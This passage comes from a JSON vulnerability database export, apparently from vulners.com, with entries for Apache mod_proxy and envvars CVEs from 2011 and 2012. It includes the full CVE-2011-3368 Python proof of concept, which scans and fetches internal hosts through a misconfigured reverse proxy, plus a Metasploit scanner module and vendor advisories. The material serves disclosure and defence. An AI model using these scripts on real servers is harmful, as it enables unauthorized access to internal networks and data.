apache_port, internal_target, tested_ports, resource):\r\n\tprint\r\n\tprint \"CVE-2011-3368 proof of concept by Rodrigo Marcos\"\r\n\tprint \"http://www.secforce.co.uk\"\r\n\tprint\r\n\tprint \" [+] Target: \" + apache_target\r\n\tprint \" [+] Target port: \" + apache_port\r\n\tprint \" [+] Internal host: \" + internal_target\r\n\tprint \" [+] Tested ports: \" + str(tested_ports)\r\n\tprint \" [+] Internal resource: \" + resource\r\n\tprint\r\n\r\n\r\ndef main():\r\n\r\n\tglobal apache_target\r\n\tglobal apache_port\r\n\tglobal url\r\n\tglobal internal_target\r\n\tglobal internal_port\r\n\tglobal resource\r\n\r\n\ttry:\r\n\t\topts, args = getopt.getopt(sys.argv[1:], \"u:r:p:d:e:g:h\", [\"help\"])\r\n\texcept getopt.GetoptError:\r\n\t\tusage()\r\n\t\tsys.exit(2)\r\n\r\n\ttry:\r\n\t\tfor o, a in opts:\r\n\t\t\tif o in (\"-h\", \"--help\"):\r\n\t\t\t\tusage()\r\n\t\t\t\tsys.exit(2)\r\n\t\t\tif o == \"-u\":\r\n\t\t\t\turl=a\r\n\t\t\tif o == \"-r\":\r\n\t\t\t\tapache_target=a\r\n\t\t\tif o == \"-p\":\r\n\t\t\t\tapache_port=a\r\n\t\t\tif o == \"-d\":\r\n\t\t\t\tinternal_target = a\r\n\t\t\tif o == \"-e\":\r\n\t\t\t\tinternal_port=a\r\n\t\t\tif o == \"-g\":\r\n\t\t\t\tresource=a\t\t\t\t\r\n\t\t\r\n\texcept getopt.GetoptError:\r\n\t\tusage()\r\n\t\tsys.exit(2)\r\n\t\t\r\n\tif apache_target == \"\":\r\n\t\tusage()\r\n\t\tsys.exit(2)\r\n\r\n\r\nurl = \"/\"\r\napache_target = \"\"\r\napache_port = \"80\"\r\ninternal_target = \"127.0.0.1\"\r\ninternal_port = \"\"\r\nresource = \"/\"\r\n\r\nmain()\r\n\r\nif internal_port!=\"\":\r\n\ttested_ports = [internal_port]\r\nelse:\r\n\ttested_ports = known_ports\r\n\r\nscan_host(url, apache_target, apache_port, internal_target, tested_ports, resource)\r\n\r\n\r\n",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:17969"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2011-10-11T00:00:00",
            "published": "2011-10-11T00:00:00",
            "href": "https://packetstormsecurity.com/files/105672/Apache-mod_proxy-Proof-Of-Concept.html",
            "id": "PACKETSTORM:105672",
            "type": "packetstorm",
            "title": "Apache mod_proxy Proof Of Concept",
            "sourceData": "`#!/usr/bin/env python  \n  \nimport socket  \nimport string  \nimport getopt, sys  \n  \n  \nknown_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]  \n  \ndef send_request(url, apache_target, apache_port, internal_target, internal_port, resource):  \n  \nget = \"GET \" + url + \"@\" + internal_target + \":\" + internal_port + \"/\" + resource + \" HTTP/1.1\\r\\n\"  \nget = get + \"Host: \" + apache_target + \"\\r\\n\\r\\n\"  \n  \nremoteserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \nremoteserver.settimeout(3)  \n  \ntry:  \nremoteserver.connect((apache_target, int(apache_port)))  \nremoteserver.send(get)  \nreturn remoteserver.recv(4096)  \nexcept:  \nreturn \"\"  \n  \ndef get_banner(result):  \nreturn result[string.find(result, \"\\r\\n\\r\\n\")+4:]  \n  \n  \ndef scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource):  \n  \nprint_banner(url, apache_target, apache_port, internal_target, tested_ports, resource)  \nfor port in tested_ports:  \nport = str(port)  \nresult = send_request(url, apache_target, apache_port, internal_target, port, resource)  \nif string.find(result,\"HTTP/1.1 200\")!=-1 or \\  \nstring.find(result,\"HTTP/1.1 30\")!=-1 or \\  \nstring.find(result,\"HTTP/1.1 502\")!=-1:  \nprint \"- Open port: \" + port + \"/TCP\"  \nprint get_banner(result)  \nelif len(result)==0:  \nprint \"- Filtered port: \" + port + \"/TCP\"  \nelse:  \nprint \"- Closed port: \" + port + \"/TCP\"  \n  \n  \ndef usage():  \nprint  \nprint \"CVE-2011-3368 proof of concept by Rodrigo Marcos\"  \nprint \"http://www.secforce.co.uk\"  \nprint  \nprint \"usage():\"  \nprint \"python apache_scan.py [options]\"  \nprint  \nprint \" [options]\"  \nprint \" -r: Remote Apache host\"  \nprint \" -p: Remote Apache port (default is 80)\"  \nprint \" -u: URL on the remote web server (default is /)\"  \nprint \" -d: Host in the DMZ (default is 127.0.0.1)\"  \nprint \" -e: Port in the DMZ (enables 'single port scan')\"  \nprint \" -g: GET request to the host in the DMZ (default is /)\"  \nprint \" -h: Help page\"  \nprint  \nprint \"examples:\"  \nprint \" - Port scan of the remote host\"  \nprint \" python apache_scan.py -r www.example.com -u /images/test.gif\"  \nprint \" - Port scan of a host in the DMZ\"  \nprint \" python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local\"  \nprint \" - Retrieve a resource from a host in the DMZ\"  \nprint \" python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local -e 80 -g /accounts/index.html\"  \nprint  \n  \ndef print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource):  \nprint  \nprint \"CVE-2011-3368 proof of concept by Rodrigo Marcos\"  \nprint \"http://www.secforce.co.uk\"  \nprint  \nprint \" [+] Target: \" + apache_target  \nprint \" [+] Target port: \" + apache_port  \nprint \" [+] Internal host: \" + internal_target  \nprint \" [+] Tested ports: \" + str(tested_ports)  \nprint \" [+] Internal resource: \" + resource  \nprint  \n  \n  \ndef main():  \n  \nglobal apache_target  \nglobal apache_port  \nglobal url  \nglobal internal_target  \nglobal internal_port  \nglobal resource  \n  \ntry:  \nopts, args = getopt.getopt(sys.argv[1:], \"u:r:p:d:e:g:h\", [\"help\"])  \nexcept getopt.GetoptError:  \nusage()  \nsys.exit(2)  \n  \ntry:  \nfor o, a in opts:  \nif o in (\"-h\", \"--help\"):  \nusage()  \nsys.exit(2)  \nif o == \"-u\":  \nurl=a  \nif o == \"-r\":  \napache_target=a  \nif o == \"-p\":  \napache_port=a  \nif o == \"-d\":  \ninternal_target = a  \nif o == \"-e\":  \ninternal_port=a  \nif o == \"-g\":  \nresource=a   \n  \nexcept getopt.GetoptError:  \nusage()  \nsys.exit(2)  \n  \nif apache_target == \"\":  \nusage()  \nsys.exit(2)  \n  \n  \nurl = \"/\"  \napache_target = \"\"  \napache_port = \"80\"  \ninternal_target = \"127.0.0.1\"  \ninternal_port = \"\"  \nresource = \"/\"  \n  \nmain()  \n  \nif internal_port!=\"\":  \ntested_ports = [internal_port]  \nelse:  \ntested_ports = known_ports  \n  \nscan_host(url, apache_target, apache_port, internal_target, tested_ports, resource)  \n  \n  \n`\n",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:105672"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Scan for poorly configured reverse proxy servers. By default, this module attempts to force the server to make a request with an invalid domain name. Then, if the bypass is successful, the server will look it up and of course fail, then responding with a status code 502. A baseline status code is always established and if that baseline matches your test status code, the injection attempt does not occur. \"set VERBOSE true\" if you are paranoid and want to catch potential false negatives. Works best against Apache and mod_rewrite\n",
            "modified": "2017-07-24T13:26:21",
            "published": "2011-10-10T22:34:50",
            "id": "MSF:AUXILIARY/SCANNER/HTTP/REWRITE_PROXY_BYPASS",
            "href": "",
            "type": "metasploit",
            "title": "Apache Reverse Proxy Bypass Vulnerability Scanner",
            "sourceData": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Apache Reverse Proxy Bypass Vulnerability Scanner',\n      'Description' => %q{\n        Scan for poorly configured reverse proxy servers.\n        By default, this module attempts to force the server to make\n        a request with an invalid domain name. Then, if the bypass\n        is successful, the server will look it up and of course fail,\n        then responding with a status code 502. A baseline status code\n        is always established and if that baseline matches your test\n        status code, the injection attempt does not occur.\n        \"set VERBOSE true\" if you are paranoid and want to catch potential\n        false negatives. Works best against Apache and mod_rewrite\n      },\n      'Author'      => ['chao-mu'],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['URL', 'http://www.contextis.com/research/blog/reverseproxybypass/'],\n          ['CVE', '2011-3368'],\n        ]\n    )\n\n    register_options(\n      [\n        OptString.new('ESCAPE_SEQUENCE',\n          [true, 'Character(s) that terminate the rewrite rule', '@']),\n\n        OptString.new('INJECTED_URI',\n          [true, 'String injected after escape sequence', '...']),\n\n        OptInt.new('EXPECTED_RESPONSE',\n          [true, 'Status code that indicates vulnerability', 502]),\n\n        OptString.new('BASELINE_URI',\n          [true, 'Requested to establish that EXPECTED_RESPONSE is not the usual response', '/']),\n      ])\n  end\n\n  def make_request(host, uri, timeout=20)\n    begin\n      requested_at = Time.now.utc\n      response     = send_request_raw({'uri' => uri}, timeout)\n      responded_at = Time.now.utc\n    rescue ::Rex::ConnectionError => e\n      vprint_error e.to_s\n      return nil\n    end\n\n    if response.nil?\n      vprint_error \"#{rhost}:#{rport} Request timed out\"\n      return nil\n    end\n\n    seconds_transpired = (responded_at - requested_at).to_f\n    vprint_status \"#{rhost}:#{rport} Server took #{seconds_transpired} seconds to respond to URI #{uri}\"\n\n    status_code = response.code\n    vprint_status \"#{rhost}:#{rport} Server responded with status code #{status_code} to URI #{uri}\"\n\n    return {\n      :requested_at => requested_at,\n      :responded_at => responded_at,\n      :status_code  => status_code\n    }\n  end\n\n  def run_host(host)\n    test_status_code = datastore['EXPECTED_RESPONSE']\n\n    baseline = make_request(host, datastore['BASELINE_URI'])\n    if baseline.nil?\n      return\n    end\n\n    if baseline[:status_code] == test_status_code\n      vprint_error \"#{rhost}:#{rport} The baseline status code for #{host} matches our test's\"\n      return\n    end\n\n    uri = datastore['ESCAPE_SEQUENCE'] + datastore['INJECTED_URI']\n    injection_info = make_request(host, uri, 60)\n\n    status_code = injection_info[:status_code]\n    if status_code == test_status_code\n      print_good \"#{rhost}:#{rport} Server appears to be vulnerable!\"\n      report_vuln(\n        :host   => host,\n        :port   => rport,\n        :proto  => 'tcp',\n        :sname  => ssl ? 'https' : 'http',\n        :name   => self.name,\n        :info   => \"Module #{self.fullname} obtained #{status_code} when requesting #{uri}\",\n        :refs   => self.references,\n        :exploited_at => injection_info[:requested_at]\n      )\n    end\n  end\nend\n",
            "cvss": {
                "score": 5.0,
                "vector": "AV:N/AC:L/Au:N/C:P/I:N/A:N"
            },
            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/REWRITE_PROXY_BYPASS"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Bugtraq ID: 49957\r\nCVE ID\uff1aCVE-2011-3368\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u5f00\u653e\u6e90\u4ee3\u7801\u7684HTTPD\u670d\u52a1\u7a0b\u5e8f\u3002\r\nApache HTTP Server mod_proxy\u6a21\u5757\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u5141\u8bb8\u6076\u610f\u7528\u6237\u7ed5\u8fc7\u90e8\u5206\u5b89\u5168\u9650\u5236\u3002\r\n\u5f53mod_proxy\u6a21\u5757\u914d\u7f6e\u4ee5\u53cd\u5411\u4ee3\u7406\u6a21\u5f0f\u65f6\u53d7\u6b64\u6f0f\u6d1e\u5f71\u54cd\uff0c\u7531\u4e8e\u4e0d\u6b63\u786e\u5904\u7406\u90e8\u5206WEB\u8bf7\u6c42\uff0c\u653b\u51fb\u8005\u6784\u5efa\u7279\u5236\u7684URL\u53ef\u5411\u4ee3\u7406\u540e\u7684\u4e0d\u53ef\u671f\u670d\u52a1\u5668\u53d1\u9001\u6076\u610f\u8bf7\u6c42\u3002\r\n\u8981\u6210\u529f\u5229\u7528\u6f0f\u6d1e\u9700\u8981\u4f7f\u7528\u5177\u6709\u4e00\u5b9a\u7684\u6a21\u5f0f\u5339\u914d\u7684&quot;ProxyPassMatch&quot;\u548c&quot;RewriteRule&quot;\u914d\u7f6e\u547d\u4ee4\u3002\n\nApache 2.0.x\r\nApache 2.2.x\n\u5382\u5546\u89e3\u51b3\u65b9\u6848\r\n\u7528\u6237\u53ef\u53c2\u8003\u5982\u4e0b\u4f9b\u5e94\u5546\u63d0\u4f9b\u7684\u5b89\u5168\u8865\u4e01\uff1a\r\nhttp://www.apache.org/dist/httpd/patches/apply_to_2.2.21/CVE-2011-3368.patch",
            "modified": "2011-10-08T00:00:00",
            "published": "2011-10-08T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20979",
            "id": "SSV:20979",
            "title": "Apache HTTP Server 'mod_proxy'\u53cd\u5411\u4ee3\u7406\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "\n                                                \u5982\u5982\u4e0b\u7684\u914d\u7f6e\uff1a\r\nRewriteRule (.*)\\.(jpg|gif|png) http://images.example.com$1.$2 [P]\r\nProxyPassMatch (.*)\\.(jpg|gif|png) http://images.example.com$1.$2\r\n\u53ef\u5bfc\u81f4\u6cc4\u9732\u5185\u90e8\u670d\u52a1\u5668\u4fe1\u606f\uff0c\u5982\u4e0b\u5f62\u5f0f\u7684\u8bf7\u6c42\uff1a\r\n  GET @other.example.com/something.png HTTP/1.1\r\n \r\n\u4f1a\u8f6c\u8bd1\u6210\u5982\u4e0b\u7684\u76ee\u6807\u8bf7\u6c42\r\nhttp://images.example.com () other example com/something.png\r\n\u8fd9\u4f1a\u5bfc\u81f4\u4ee3\u7406\u8fde\u63a5&quot;other.example.com&quot;\uff0c\u56e0\u4e3a\u5f53\u89e3\u6790URL\u65f6&quot;images.example.com@&quot;\u6bb5\u4f1a\u4f5c\u4e3a\u7528\u6237\u9a8c\u8bc1\u51ed\u636e\u4f7f\u7528\u3002\n                              ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20979"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2011-10-06T00:00:00",
            "published": "2011-10-06T00:00:00",
            "href": "https://packetstormsecurity.com/files/105591/Apache-Reverse-Proxy-Bypass.html",
            "id": "PACKETSTORM:105591",
            "type": "packetstorm",
            "title": "Apache Reverse Proxy Bypass",
            "sourceData": "`===============================ADVISORY==============================  \nSystems Affected: Apache httpd  \nSeverity: High  \nCategory: Proxy Bypass  \nAuthor: Context Information Security Ltd  \nReported to vendor: 16th November 2011  \nAdvisory Issued: 5th October 2011  \nReference: CVE-2011-3368  \n===============================ADVISORY==============================  \n  \nDescription  \n-----------  \nContext discovered a security vulnerability which allows for Apache in reverse proxy mode to be used to access internal/DMZ systems due to a weakness in its handling of URLs being processed by mod_rewrite.  \n  \nAnalysis  \n--------  \nIf the Apache configuration file is configured as follows (as previously recommended by Apache):  \n  \nRewriteRule ^(.*) http://internalserver$1 [P]  \n  \nAnd not with a trailing slash:  \n  \nRewriteRule ^(.*) http://internalserver/$1 [P]  \n  \nThen a request can be made to the proxy server to alter the URL using the user authentication URI syntax, such as:  \n  \nGET @InternalNotAccessibleServer/console HTTP/1.0  \n  \nCausing the proxy to rewrite the URL to:  \n  \nhttp://internalserver@InternalNotAccessibleServer/console  \n  \nAnd provide access to the internal server which is not externally accessible.  \n  \nFor an in-depth analysis of this security issue read Context\u0092s blog at:  \nhttp://www.contextis.com/research/blog/reverseproxybypass/  \n  \nTechnologies Affected  \n---------------------  \n  \nApache httpd 1.3 all versions  \nApache httpd 2.x all versions  \n  \n  \n  \nVendor Response  \n---------------  \nApache have released a patch for this issue but recommend configuration files are reviewed.   \nPatch available from:  \nhttp://www.apache.org/dist/httpd/patches/apply_to_2.2.21/  \n  \n  \nDisclosure Timeline  \n-------------------  \n16th November 2011 \u0096 Vendor Notification  \n5th October 2011 \u0096 Patch Released by Apache  \n  \n  \nCredits  \n--------  \nMichael Jordon and David Robinson of Context Information Security Ltd  \n  \n  \nAbout Context Information Security  \n----------------------------------  \n  \nContext Information Security is an independent security consultancy specialising in both technical security and information assurance services.  \n  \nThe company was founded in 1998. Its client base has grown steadily over the years, thanks in large part to personal recommendations from existing clients who value us as business partners. We believe our success is based on the value our clients place on our product-agnostic, holistic approach; the way we work closely with them to develop a tailored service; and to the independence, integrity and technical skills of our consultants.  \n  \nThe company\u0092s client base now includes some of the most prestigious blue chip companies in the world, as well as government organisations.   \n  \nThe best security experts need to bring a broad portfolio of skills to the job, so Context has always sought to recruit staff with extensive business experience as well as technical expertise. Our aim is to provide effective and practical solutions, advice and support: when we report back to clients we always communicate our findings and recommendations in plain terms at a business level as well as in the form of an in-depth technical report.  \n  \nWeb: www.contextis.com  \nEmail: disclosure@contextis.com  \n  \n  \n  \n  \n`\n",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:105591"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2011-10-06T00:00:00",
            "published": "2011-10-06T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20969",
            "id": "SSV:20969",
            "title": "Apache mod_proxy Reverse Proxy Exposure",
            "type": "seebug",
            "sourceData": "\n                                                -----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA1\r\n\r\nApache HTTP Server Security Advisory\r\n====================================\r\n\r\nTitle:       mod_proxy reverse proxy exposure\r\n\r\nCVE:         CVE-2011-3368\r\nDate:        20111005\r\nProduct:     Apache HTTP Server\r\nVersions:    httpd 1.3 all versions, httpd 2.x all versions\r\n\r\nDescription:\r\n============\r\n\r\nAn exposure was reported affecting the use of Apache HTTP Server in\r\nreverse proxy mode.  We would like to thank Context Information\r\nSecurity Ltd for reporting this issue to us.\r\n\r\nWhen using the RewriteRule or ProxyPassMatch directives to configure a\r\nreverse proxy using a pattern match, it is possible to inadvertently\r\nexpose internal servers to remote users who send carefully crafted\r\nrequests.  The server did not validate that the input to the pattern\r\nmatch was a valid path string, so a pattern could expand to an\r\nunintended target URL.\r\n\r\nFor future releases of the Apache HTTP Server, the software will\r\nvalidate the request URI, correcting this specific vulnerability.  The\r\ndocumentation has been updated to reflect the more general risks with\r\npattern matching in a reverse proxy configuration.\r\n\r\nDetails:\r\n========\r\n\r\nA configuration like one of the following examples:\r\n\r\n  RewriteRule (.*)\\.(jpg|gif|png)    http://images.example.com$1.$2 [P]\r\n  ProxyPassMatch (.*)\\.(jpg|gif|png) http://images.example.com$1.$2\r\n\r\ncould result in an exposure of internal servers.  A request of the form:\r\n\r\n  GET @other.example.com/something.png HTTP/1.1\r\n\r\nwould get translated to a target of:\r\n\r\n  http://images.example.com@other.example.com/something.png\r\n\r\nThis will cause the proxy to connect to the hostname\r\n&quot;other.example.com&quot;, as the &quot;images.example.com@&quot; segment would be\r\ntreated as user credentials when parsing the URL.  This would allow a\r\nremote attacker the ability to proxy to hosts other than those\r\nexpected, which could be a security exposure in some circumstances.\r\n\r\nThe request-URI string in this example,\r\n&quot;@other.example.com/something.png&quot;, is not valid according to the HTTP\r\nspecification, since it neither an absolute URI\r\n(&quot;http://example.com/path&quot;) nor an absolute path (&quot;/path&quot;).  For\r\nfuture releases, the server has been patched to reject such requests,\r\ninstead returning a &quot;400 Bad Request&quot; error.\r\n\r\nActions:\r\n========\r\n\r\nApache HTTPD users should examine their configuration files to determine \r\nif they have used an insecure configuration for reverse proxying.  \r\nAffected users can update their configuration, or apply the patch from:\r\n\r\n   http://www.apache.org/dist/httpd/patches/apply_to_2.2.21/\r\n\r\nFor example, the above RewriteRule could be changed to:\r\n\r\n  RewriteRule /(.*)\\.(jpg|gif|png)    http://images.example.com/$1.$2 [P]\r\n\r\nto ensure the pattern only matches against paths with a leading &quot;/&quot;.\r\n\r\n-----BEGIN PGP SIGNATURE-----\r\nVersion: GnuPG v1.4.11 (GNU/Linux)\r\n\r\niEYEARECAAYFAk6MZZAACgkQR/aWnQ5EzwxdfQCg0yX+OplatMPQcweRneRmh5Xp\r\n5sEAoLooi9H4LW12oPgStNbY2wtyQrYP\r\n=8qjg\r\n-----END PGP SIGNATURE-----\r\n\r\n_______________________________________________\r\nFull-Disclosure - We believe in it.\r\nCharter: http://lists.grok.org.uk/full-disclosure-charter.html\r\nHosted and sponsored by Secunia - http://secunia.com/\n                              ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20969"
        }
    ],
    "CVE-2011-4317": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 50802\r\nCVE ID: CVE-2011-4317\r\n\r\nApache HTTP Server\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\u7684\u7f51\u9875\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u5927\u591a\u6570\u7535\u8111\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\uff0c\u7531\u4e8e\u5176\u8de8\u5e73\u53f0\u548c\u5b89\u5168\u6027\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u662f\u6700\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u7aef\u8f6f\u4ef6\u4e4b\u4e00\u3002\r\n\r\nApache HTTP Server\u5728\u53cd\u5411\u4ee3\u7406\u6a21\u5f0f\u4e2d\u914d\u7f6emod_proxy\u6a21\u5757\u65f6\u9519\u8bef\u5730\u5904\u7406\u4e86\u67d0\u4e9bWeb\u8bf7\u6c42\uff0c\u53ef\u901a\u8fc7\u7279\u5236\u7684URL\u5411\u4ee3\u7406\u540e\u65b9\u7684\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\uff0c\u4ece\u800c\u7ed5\u8fc7\u67d0\u4e9b\u5b89\u5168\u9650\u5236\u3002\n\nApache 2.2.x\r\nApache 2.0.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u8fd8\u6ca1\u6709\u63d0\u4f9b\u8865\u4e01\u6216\u8005\u5347\u7ea7\u7a0b\u5e8f\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u6b64\u8f6f\u4ef6\u7684\u7528\u6237\u968f\u65f6\u5173\u6ce8\u5382\u5546\u7684\u4e3b\u9875\u4ee5\u83b7\u53d6\u6700\u65b0\u7248\u672c\uff1a\r\n\r\nwww.apache.org",
            "modified": "2011-11-25T00:00:00",
            "published": "2011-11-25T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-24250",
            "id": "SSV:24250",
            "type": "seebug",
            "title": "Apache HTTP Server mod_proxy\u53cd\u5411\u4ee3\u7406\u6a21\u5f0f\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:24250"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache HTTP Server 7.0.x 'mod_proxy' Reverse Proxy Security Bypass Vulnerability. CVE-2011-4317 . Remote exploit for linux platform",
            "modified": "2011-11-24T00:00:00",
            "published": "2011-11-24T00:00:00",
            "id": "EDB-ID:36352",
            "href": "https://www.exploit-db.com/exploits/36352/",
            "type": "exploitdb",
            "title": "Apache HTTP Server 7.0.x 'mod_proxy' Reverse Proxy Security Bypass Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/50802/info\r\n\r\nApache HTTP Server is prone to a security-bypass vulnerability.\r\n\r\nSuccessful exploits will allow attackers to bypass certain security restrictions and obtain sensitive information about running web applications. \r\n\r\nThe following example patterns are available:\r\n\r\nRewriteRule ^(.*) http://www.example.com$1\r\nProxyPassMatch ^(.*) http://www.example.com$1 ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:36352"
        }
    ],
    "CVE-2012-0883": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 53046\r\nCVE(CAN) ID: CVE-2012-0883\r\n\r\nApache HTTP Server\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u7801\u7684\u7f51\u9875\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u5927\u591a\u6570\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\uff0c\u7531\u4e8e\u5176\u591a\u5e73\u53f0\u548c\u5b89\u5168\u6027\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u662f\u6700\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u7aef\u8f6f\u4ef6\u4e4b\u4e00\u3002\r\n\r\nApache HTTP Server 2.4.2\u4e4b\u524d\u7248\u672c\u5185\u7684envvars (\u5373envvars-std)\u5728LD_LIBRARY_PATH\u5185\u653e\u7f6e\u4e86\u96f6\u957f\u5ea6\u7684\u76ee\u5f55\u540d\u79f0\uff0c\u901a\u8fc7\u5728\u6267\u884capachectl\u65f6\u5728\u524d\u5de5\u4f5c\u76ee\u5f55\u5185\u6728\u9a6cDSO\uff0c\u53ef\u5141\u8bb8\u672c\u5730\u7528\u6237\u83b7\u53d6\u6743\u9650\u3002\n0\nApache 2.2.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.apache.org",
            "modified": "2012-10-11T00:00:00",
            "published": "2012-10-11T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60427",
            "id": "SSV:60427",
            "type": "seebug",
            "title": "Apache HTTP Server 'LD_LIBRARY_PATH'\u4e0d\u5b89\u5168\u5e93\u52a0\u8f7d\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 6.9,
                "vector": "AV:LOCAL/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60427"
        },
        {
            "bulletinFamily": "exploit",
            "description": "CVE ID: CVE-2012-0883\r\n\r\nApache HTTP Server\u662fApache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u4e2a\u5f00\u653e\u6e90\u7801\u7684\u7f51\u9875\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u5728\u5927\u591a\u6570\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8fd0\u884c\uff0c\u7531\u4e8e\u5176\u591a\u5e73\u53f0\u548c\u5b89\u5168\u6027\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c\u662f\u6700\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u7aef\u8f6f\u4ef6\u4e4b\u4e00\u3002\r\n\r\nApache HTTP Server 2.4.2\u4e4b\u524d\u7248\u672c\u7684envvars (\u5373envvars-std)\u5728LD_LIBRARY_PATH\u4e2d\u653e\u7f6e\u4e86\u96f6\u957f\u5ea6\u7684\u76ee\u5f55\u540d\u79f0\uff0c\u53ef\u5141\u8bb8\u672c\u5730\u7528\u6237\u5728\u6267\u884capachectl\u8fc7\u7a0b\u4e2d\u901a\u8fc7\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e2d\u7684\u6728\u9a6cDSO\u83b7\u53d6\u6743\u9650\u3002\n0\nApache Group HTTP Server &lt; 2.4.2\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\nApache Group\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08Announcement2.2\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\n\r\nAnnouncement2.2\uff1aApache HTTP Server 2.2.23 Released\r\n\r\n\u94fe\u63a5\uff1ahttp://www.apache.org/dist/httpd/Announcement2.2.html",
            "modified": "2012-09-18T00:00:00",
            "published": "2012-09-18T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60386",
            "id": "SSV:60386",
            "type": "seebug",
            "title": "Apache HTTP Server envvars\u672c\u5730\u6743\u9650\u63d0\u5347\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 6.9,
                "vector": "AV:LOCAL/AC:MEDIUM/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60386"
        },
        {
            "bulletinFamily": "exploit",
